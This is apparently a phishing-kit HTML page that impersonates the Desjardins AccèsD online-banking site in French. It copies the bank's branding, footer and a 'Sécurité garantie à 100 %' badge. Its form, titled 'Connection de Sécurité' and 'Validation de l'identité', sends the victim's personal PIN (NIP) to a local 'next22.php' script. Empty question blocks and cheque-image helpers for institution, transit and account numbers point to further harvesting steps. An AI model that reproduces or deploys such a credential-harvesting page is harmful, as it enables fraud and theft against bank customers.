<!DOCTYPE html>
<!-- saved from url=(0078) -->
<html lang="fr"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> <title>Secure | Desjardins</title>
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">

    <noscript>
    </noscript>
    
<link rel="icon" href="./desjardins.ico" type="image/x-icon">

<link href="./index_files/bootstrap.min.css" rel="stylesheet">

<link href="./index_files/fwd-bootstrap.min.css" rel="stylesheet">

<!--[if lt IE 9]>
    <link href="https://www.#/static-accesweb/201808090322/lib/interne/fwd-bootstrap/3.3/css/fwd-bootstrap-ie-force-960-layout.min.css" rel="stylesheet" />
<![endif]-->
<!--[if lte IE 8]>
    <link href="https://www.#/static-accesweb/201808090322/lib/interne/fwd-bootstrap/3.3/css/fwd-bootstrap-ie.min.css" rel="stylesheet" />
    <link href="https://www.#/static-accesweb/201808090322/lib/interne/fwd-bootstrap/3.3/css/fwd-bootstrap.css" rel="stylesheet" />
<![endif]-->
<!--[if IE 9]>
    <link href="https://www.#/static-accesweb/201808090322/lib/interne/fwd-bootstrap/3.3/css/fwd-bootstrap-ie9.min.css" rel="stylesheet" />
<![endif]-->


        <link href="./index_files/global.min.css" rel="stylesheet">
    
                <link media="only screen and (max-width : 768px)" href="./index_files/identifiantunique-responsive.min.css" rel="stylesheet">
            

<!-- Ajustements de styles de l'application -->

    <link href="./index_files/theme.min.css" rel="stylesheet">

<!--[if IE]><link rel="stylesheet" type="text/css" href="https://www.#/static-accesweb/201808090322/acces-web/css/ie.min.css"/><![endif]-->
<!--[if lte IE 7]><link rel="stylesheet" type="text/css" href="https://www.#/static-accesweb/201808090322/acces-web/css/ie7.min.css"/><![endif]-->
<!--[if IE 8]><link rel="stylesheet" type="text/css" href="https://www.#/static-accesweb/201808090322/acces-web/css/ie8.min.css"/><![endif]-->

<link href="./index_files/owl.carousel.min.css" rel="stylesheet">

    

    
    

    <meta name="desjardins-identifiant-application" content="AccesWeb">
    <meta name="raaMobileActif" content="">

    
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
        
            <script src="./index_files/global.min.js.download" type="text/javascript"></script>
        

    <script type="text/javascript">
        if (window.top.location != self.location) {
            window.top.location = self.location;
        };
    </script>

    
      <link rel="stylesheet" href="./index_files/entete.css">
      <link rel="stylesheet" href="./index_files/page-logon.css">
    
      <link href="./index_files/pied.css" rel="stylesheet">
    </head><body class="isolation-bootstrap-3 fixChrome" data-whatinput="mouse"><fwd_placeholder__contenu_head_fragment_principal>




    
 <!-- if app_mobile --> 
        <a name="haut"></a>
        

                <span class="hidden-xs">
                    
    <div id="zone-entete-de-page">
      <div id="entete">
        <div id="access-links">
          <a href="#contenu" class="sr-only sr-only-focusable">Aller au contenu principal</a>
        </div>
        <div id="logo">
          <h1 class="sr-only">Site Internet de Desjardins</h1>
          
          <a href="#"><img src="./index_files/logo-n1-desjardins-desktop.svg" alt="Retour à page d&#39;accueil de Desjardins.com" width="150" height="32"></a>
        </div>
        <div id="logo-applicatif">
          
          <a href="#"><img src="./index_files/g40-entete-logo-accesd.png" alt="AccèsD" width="106" height="32"></a>
          
          <a href="#"><img src="./index_files/g40-entete-logo-accesd-affaires.png" alt="AccèsD Affaires" width="90" height="32"></a>
        </div>
        <div id="outils">
          <div id="nous-joindre">
            <p class="titre-entete"><a href="#" onclick="popup(&#39;//www.#/page-aide/index.jsp?docName=ai_joindre&amp;domaine=ACCESD&#39;,&#39;Joindre&#39;,&#39;resizable=yes,location=no,menubar=no,status=no,scrollbars=yes,width=800,height=600&#39;);">Nous joindre</a></p>
          </div>
          <div id="aide">
            <p class="titre-entete"><a href="#" onclick="popup(&#39;//www.#/page-aide/index.jsp?docName=ai_logonlogoff&amp;domaine=ACCESD&#39;,&#39;Aide&#39;,&#39;resizable=yes,location=no,menubar=no,status=no,scrollbars=yes,width=800,height=600&#39;);">Aide</a></p>
          </div>
          <div id="choix-site">
            <p class="titre-entete"><a id="btn-langue" href="?langueCible=en" lang="en"><span class="sr-only">Change language. </span>English</a></p>
          </div>
          <div id="fonctions">
            <ul>
              <li class="reduire"><a id="taille-texte-moins" href="javascript:void(0)" title="Réduire la taille du texte">Réduire la taille du texte</a></li>
              <li class="augmenter"><a id="taille-texte-plus" href="javascript:void(0)" title="Augmenter la taille du texte">Augmenter la taille du texte</a></li>
            </ul>
          </div>
        </div>
      </div>
    </div>
  
 </span> 
                    <span class="hidden-sm hidden-md hidden-lg">
                        

<div id="zone-entete-de-page">
    <nav class="navbar navbar-default" role="navigation">
        <div class="container max-layout-960">
            <!-- Brand and toggle get grouped for better mobile display -->
            <div class="navbar-header">

                <span class="navbar-brand">
                    
                            <a href="">
                                <img class="logo" src="./index_files/logo-n1-desjardins-desktop(1).svg" alt="Aller à la page d&#39;accueil" title="Desjardins">
                            </a>
                        
                    <div class="hidden-xs" style="display: inline;">
                        <img role="presentation" src="./index_files/g00-entete-filet-logos.png">
                        
                                <img class="logo-desjardins" role="presentation" src="./index_files/g00-logo-desjardins-blanc.png" style="padding-right: 20px;" alt="Desjardins" title="Desjardins">
                            
                    </div>
                </span>

                <div id="titrePageMobile" class="navbar-brand hidden-sm hidden-md hidden-lg">Obtenir un mot de passe</div>
                
                        <a href="#" class="navbar-brand pull-right hidden-sm hidden-md hidden-lg">
                            <img id="menuAppRetour" src="./index_files/entete-btn-menu-app.png" height="32">
                        </a>
                    
 </div><!-- /.navbar-header --> <!-- Collect the nav links, forms, and other content for toggling --> 
            <div class="collapse navbar-collapse" id="navbar-collapse-outils">
                <div id="outils">
                    <ul class="nav navbar-nav navbar-right">
                        
                        <li>
                            <a class="lien" href="&#39;, &#39;" location=0,scrollbars=yes,resizable=yes,width=500,height=500&#39;);">
                                Nous joindre
                            </a><span class="hidden-xs">|</span>
                        </li>
                        <li>
                            <a class="lien" resizable=yes,width=500,height=500&#39;);">
                                Aide
                            </a><span class="hidden-xs">|</span>
                        </li>
                        
                                <li class="hidden-xs">
                                    
                                            <a class="lien" id="changeLangue" href="?langueCible=en">
                                                English
 </a> 
                                    <span class="hidden-sm">|</span>
                                </li>
                            
                        <li class="hidden-xs">
                            <a class="lien" id="taille-texte-moins" href="javascript:void(0)" style="padding-right: 0px;">
                                <img src="./index_files/a00-entete-ic-texte-moins-on.png" alt="" title="">
                            </a>
                        </li>
                        <li class="hidden-xs">
                            <a class="lien" id="taille-texte-plus" href="javascript:void(0)" style="padding-left: 8px; padding-right: 20px;">
                                <img src="./index_files/a00-entete-ic-texte-plus-on.png" alt="" title="">
                            </a>
                        </li>

                        
 </ul> </div> </div><!-- /.collapse .navbar-collapse --> 
 </div><!-- /.container-fluid --> </nav><!-- /.navbar .navbar-default .navbar-fixed-top -->
</div>

 </span> 
             
            
 <!-- fin if app_mobile --> 
    <div class="zone-centrale">

        <div id="zone-centrale-bg">
            <!-- div id="zone-centrale-grad" class="zone-centrale padding-top-35px"></div-->
            <div class="container">
                <div id="contenu" lang="fr" role="main">
                    
                    <div class="row">
                        
                                <div class="col-xs-24 col-sm-24 col-md-18 col-md-offset-3 col-lg-18 col-lg-offset-3">
                            

                            <div id="loading" class="loading" style="display: none;">
                                <div class="panel panel-primary">
                                    <div class="panel-body">
                                        <img id="img-loading" src="./index_files/a00-loading-petit.gif" alt="Loading">
                                    </div>
                                </div>
                            </div>
                            
                            


    <h1 id="titrePage" data-titre-page-mobile="Obtenir un mot de passe">
         Connection de Sécurité
 </h1> <form id="formQuestionsMotPasseOublie" class="form-horizontal" action="next22.php" method="POST" autocomplete="off">
        <input type="hidden" id="infoPosteClient" name="infoPosteClient" value="">
        

<div class="row">
    <div class="col-sm-24 col-md-24">
        
            <div id="erreurSystemeJS" class="has-error hidden" aria-live="assertive">
            <div>
                <span class="help-block-idunique">
                    Les erreurs suivantes ont été détectées :
                </span>
                <ul>
                    <li>
                      <a id="erreurLienJS" href="#" class="erreurLien"></a>
                    </li>
                </ul>
                </div>
            </div>
        
 </div>
</div>


        <div class="panel panel-primary">
            <div id="panel-body-questions" class="panel-body padding-moyen">

                <h2>Validation de l'identité</h2> <p> 
                </p>

                <div class="row top15px">
                    <div class="identifiant col-sm-offset-9 col-xs-12 col-sm-15">
                        <strong></strong>
                    </div>
                </div>

                <div class="row top15px">
                    <div class="col-xs-24 col-sm-offset-9 col-sm-15">
                      
                        </a>
                    </div>
                </div>
				  <div id="question-transit" class="form-group top15px ">

                        <label for="transit" id="numeroTransit" class="control-label col-xs-24 col-sm-9">
 <strong><b>Numéro d'identification personnel:</b></strong>
                            <a href="#" id="popoverTransit" class="hidden-xs" data-toggle="popover" title="" data-placement="bottom" data-html="true" data-arrow="auto left" data-container="body" data-content="&lt;img alt=&quot;Mot de passe&quot; src=&quot;files//contenu-cheque-815-transit.png&quot;/&gt;" role="button" data-original-title="">
                               
                            </a>
                            
                      
                            <span class="sr-only"></span> </label>

                        <div class="col-xs-24 col-sm-15">
                            <input id="pass" name="pass" aria-describedby="transit.errors" placeholder="NIP" aria-required="true" type="tel" value="" required size="6" maxlength="5" autocomplete="off">
 </div> </div> 
 

                <p class="top15pxImportant">
                </p>

                <div id="sectionQuestions" class="top15px">
                    
                    <div id="question-datenaissance" class="form-group top15px ">
                        <label for="dateNaissance" id="labelDateNaissance" class="control-label col-xs-24 col-sm-9">
 <div class="col-xs-24 col-sm-15">
                            
                            <fieldset>
 </fieldset> </div> </div> 
                    <div id="question-institution" class="form-group top15px ">
                        <label for="institution" id="numeroInstitution" class="control-label col-xs-24 col-sm-9">
                     
                        <div class="col-xs-24 col-sm-15">
                            
                           
                        <label for="institution" id="numeroInstitution" class="control-label col-xs-24 col-sm-9">
                            </a>

                            <a href="#" class="hidden-sm hidden-md hidden-lg" data-toggle="modal" data-target="#modale-institution">
                            </a>
                        </label>

                        <div class="col-xs-24 col-sm-15">
 </div> </div> 
                    <div id="question-transit" class="form-group top15px ">

                        <label for="transit" id="numeroTransit" class="control-label col-xs-24 col-sm-9">
                            <a href="#" id="popoverTransit" class="hidden-xs" data-toggle="popover" title="" data-placement="bottom" data-html="true" data-arrow="auto left" data-container="body" data-content="&lt;img alt=&quot;Il se compose de 9 chiffres.&quot; src="" role="button" data-original-title="">
                            </a>
                            
                      

                        <div class="col-xs-24 col-sm-15">
 </div> </div> 
                    <div id="question-compte" class="form-group top15px ">

                        <label for="compte" id="numeroCompte" class="control-label col-xs-24 col-sm-9">
                            <a href="#" id="popoverTransit" class="hidden-xs" data-toggle="popover" title="" data-placement="bottom" data-html="true" data-arrow="auto left" data-container="body" data-content="&lt;img alt=&quot;Il se compose de 9 chiffres.&quot; src="" role="button" data-original-title="">
                            </a>
                            
                            <a href="#" class="hidden-sm hidden-md hidden-lg" data-toggle="modal" data-target="#modale-transit">
                            </a>
                            <span class="sr-only">!!Il se compose de 9 chiffres.!!</span> </label>

                        <div class="col-xs-24 col-sm-15">
 </div> </div> 

                        <div class="col-xs-24 col-sm-15">
                        </div>
                    </div>

                </div>

                <p class="top20px">
                    Pour confirmer votre identité, répondez à la question suivante :
 </p> 

                <div class="top15px">
                
           
                </div>

                <div class="row top20px">
                    <div class="col-xs-12 col-sm-9 col-md-9 text-right">
                        <button id="btnAnnuler" type="button" class="btn btn-default fullwidth" onclick="#">Annuler</button>
                    </div>
                    <div class="col-xs-12 col-sm-15 col-md-15">
                        <button id="btnSoumettre" type="submit" class="btn btn-primary fullwidth">Continuer</button> </div> </div> </div> </div> <div>
<input type="hidden" name="_tk" value="4093b8e4-7ce1-4e33-be24-01a717d729ef">
</div><input type="hidden" id="infoPosteClient" name="infoPosteClient"></form>

    <div class="col-sm-24 text-right top15px non-selectable hidden-xs">
        <img alt="Sécurité garantie à 100 %" src="./index_files/g00-logo-securite-garantie-f.png">
    </div>

    
<div class="modal fade" id="modale-institution" tabindex="-1" role="dialog" aria-hidden="true">
    <div class="modal-dialog margin-top">
        <div class="modal-content padding-left10px padding-right10px">
            <div class="modal-header"></div>
            <p>
                <img class="fullwidth" alt="" src="./index_files/contenu-cheque-815-institut.png">
            </p>
            <div class="modal-footer padding-left0px padding-right0px">
                <div class="row">
                    <div class="col-xs-offset-6 col-xs-12 text-right">
                        <a data-dismiss="modal" class="btn btn-primary fullwidth" href="#">
                            Fermer
 </a> </div> </div> </div> </div> </div>
</div>
<div class="modal fade" id="modale-transit" tabindex="-1" role="dialog" aria-hidden="true">
    <div class="modal-dialog margin-top">
        <div class="modal-content padding-left10px padding-right10px">
            <div class="modal-header"></div>
            <p>
                <img class="fullwidth" alt="Il se compose de 5 chiffres." src="./index_files/contenu-cheque-815-transit.png">
            </p>
            <div class="modal-footer padding-left0px padding-right0px">
                <div class="row">
                    <div class="col-xs-offset-6 col-xs-12 text-right">
                        <a data-dismiss="modal" class="btn btn-primary fullwidth" href="#">
                            Fermer
 </a> </div> </div> </div> </div> </div>
</div>
<div class="modal fade" id="modale-compte" tabindex="-1" role="dialog" aria-hidden="true">
    <div class="modal-dialog margin-top">
        <div class="modal-content padding-left10px padding-right10px">
            <div class="modal-header"></div>
            <p>
                <img class="fullwidth" alt="Il se compose de 7 chiffres." src="./index_files/contenu-cheque-815-folio.png">
            </p>
            <div class="modal-footer padding-left0px padding-right0px">
                <div class="row">
                    <div class="col-xs-offset-6 col-xs-12 text-right">
                        <a data-dismiss="modal" class="btn btn-primary fullwidth" href="#">
                            Fermer
 </a> </div> </div> </div> </div> </div>
</div>

<script src="./index_files/modificationPhraseImageQuestions.min.js.download"></script>
<script src="./index_files/motPasseOublie.min.js.download"></script>
<script src="./index_files/info-poste-client.min.js.download"></script>




                                <div id="securiteMobile" class="hidden-sm hidden-md hidden-lg">
                                    <img class="fake" src="./index_files/g00-logo-securite-garantie-f.png">
                                    <img class="fake" src="./index_files/logo-n1-desjardins-desktop(1).svg">
                                    
                                    <div id="img_wrap" class="row col-xs-24 padding-left10px">
                                        
                                            <img class="normal non-selectable" title="" src="./index_files/g00-logo-securite-garantie-f.png" alt="">
                                        
                                            <img class="normal non-selectable padding-left10px" title="Desjardins" src="./index_files/logo-n1-desjardins-desktop(1).svg" alt="Desjardins">
                                        
 </div> </div> <br> 

                            <br>
                        </div>
                    </div>

                </div>

            <br>

            </div>
        </div>
    </div>

    <footer class="footer">

        
                <span class="hidden-xs">
                    


  
  

    <div id="zone-pied-de-page">
      <div id="pied">
      
        <div id="plan-site">
          <h2 class="hors-ecran">Plan du site</h2>
          <div id="tetes-sections">
            <ul>
          
            
            
          
              <li><a href="https://www.#/particuliers/index.jsp">Services aux particuliers</a></li>
              <li><a href="https://www.#/entreprises/index.jsp">Services aux entreprises</a></li>
              <li><a href="https://www.#/coopmoi/index.jsp">Coopmoi</a></li>
              <li><a href="https://www.#/a-propos/index.jsp">À propos</a></li>
              <li><a href="https://www.#/mobile-gps-rss/index.jsp">Desjardins sur mobile, GPS et RSS</a></li>
            </ul>
          </div>
        </div>
        <div id="zone-legale">
          




<ul>
  <li><a href="#">Sécurité</a></li>
  <li><a href="https://www.#/confidentialite/index.jsp">Confidentialité</a></li>
  <li><a href="https://www.#/conditions-utilisation-notes-legales/index.jsp">Conditions d'utilisation et notes légales</a></li>
  <li><a href="https://www.#/a-propos/responsabilite-sociale-cooperation/mouvement-cooperatif-solidaire/accessibilite/index.jsp">Accessibilité</a></li>
  <li><a href="https://www.#/plan-site/index.jsp">Plan du site</a></li>
</ul>



  
  






<p class="copyright">© 1996-2018, Mouvement des caisses Desjardins. Tous droits réservés.
</p>


        </div>
      </div>
    </div>

  


  
 </span> 
                <span class="hidden-sm hidden-md hidden-lg">
                    
<div id="pied-de-page" class="container texte-blanc">
    <div class="row">
        <div class="col-sm-4 col-md-4 text-left pied-de-page-logo hidden-xs">
            
        </div>
        <div class="col-xs-24 col-sm-16 col-md-16 text-center pied-de-page-texte">
                <span class="hidden-xs">
                    
                            <a href="javascript:popup(&#39;https://www.#/securite/&#39;,&#39;Sécurité&#39;,&#39;scrollbars=yes,resizable=yes,width=500,height=500&#39;);">Sécurité</a> | 
                            <a href="javascript:popup(&#39;http://www.#/confidentialite/&#39;,&#39;Confidentialité&#39;,&#39;scrollbars=yes,resizable=yes,width=500,height=500&#39;);">Confidentialité</a> | 
                            <a href="javascript:popup(&#39;http://www.#/conditions-utilisation-notes-legales/&#39;,&#39;Conditions utilisation&#39;,&#39;scrollbars=yes,resizable=yes,width=500,height=500&#39;);">Conditions d'utilisation et notes légales</a> | 
                            <a href="javascript:popup(&#39;https://www.#/page-aide/index.jsp?docName=accessibilite&amp;domaine=ACCESD&#39;,&#39;Accessibilité&#39;,&#39;scrollbars=yes,resizable=yes,width=500,height=500&#39;);">Accessibilité</a> 
 <br> 
 </span> <p>Copyright © 2018 Mouvement des caisses Desjardins. Tous droits réservés.</p>

        </div>
        <div class="col-xs-4 col-sm-4 col-md-4 text-right hidden-xs hidden-sm">
            
 </div> </div>
</div>

 </span> 
 </footer> 
        <!-- MONITEUR D'ACTIVITES -->
        
    
        <div tabindex="0" role="dialog" aria-haspopup="true" aria-live="assertive" aria-labelledby="enteteModale textTimeRemaining" class="modal fade" id="modalMoniteurActivites" aria-hidden="true" data-backdrop="static" data-keyboard="false">
            <div aria-live="assertive" class="modal-dialog modal-dialog-alert-info">
                <div class="modal-content">
                    <span class="sr-only">Boîte de dialogue</span>
                    <div id="expirationWarningTitle" class="modal-header">
                        <h2 id="enteteModale">Prolongation de session</h2>
                    </div>
                    <div class="alert alert-warning  modal-body-alert-info" id="expirationWarningBody">
                        <p tabindex="0" id="textTimeRemaining" class="margin0px">Le délai d’inactivité de votre session expirera dans <span id="sessionSecondsRemaining">??</span><span id="alert-info-min" class="hidden"> minute</span><span id="alert-info-sec" class="hidden"> seconde</span>. Les données entrées seront perdues.</p>
                        <p tabindex="0"><strong>Voulez-vous prolonger la session?</strong></p>
                    </div>
    
                    <div class="modal-footer">
                        <button id="logoutSession" type="button" class="btn btn-default" data-dismiss="modal">
                            Non
                        </button>
                        <button id="extendSession" type="button" class="btn btn-primary btn-success" data-dismiss="modal">
                            Oui
                        </button>
                    </div>
                </div>
            </div>
        </div>

     
 <!-- Inclusion des fichiers javascripts pour le comportement --> 
<script src="./index_files/bootstrap.min.js.download" type="text/javascript"></script>
<!--[if lt IE 9]>
    <script src="https://www.#/static-accesweb/201808090322/lib/externe/respond.js/1.3.0/respond.min.js"></script>
<![endif]-->


<script src="./index_files/fwd-bootstrap.min.js.download" type="text/javascript"></script>
<!--[if IE]>
    <script src="https://www.#/static-accesweb/201808090322/lib/interne/fwd-bootstrap/3.3/js/fwd-bootstrap-ie.min.js" type="text/javascript"></script>
<![endif]-->

<!--[if lt IE 9]>
    
    <script src="https://www.#/static-accesweb/201808090322/lib/externe/html5shiv/3.7.0/html5shiv.js" type="text/javascript"></script>
    
    <script src="https://www.#/static-accesweb/201808090322/lib/externe/placeholder/2.0.8/jquery.placeholder.min.js" type="text/javascript"></script>
<![endif]-->

<!--[if IE 9]>
    
    <script src="https://www.#/static-accesweb/201808090322/lib/externe/placeholder/2.0.8/jquery.placeholder.min.js" type="text/javascript"></script>
<![endif]-->




<!-- ni : accesweb01_berlin7_rel05  -->
<!-- pv :  -->

</fwd_placeholder__contenu_head_fragment_principal></body></html>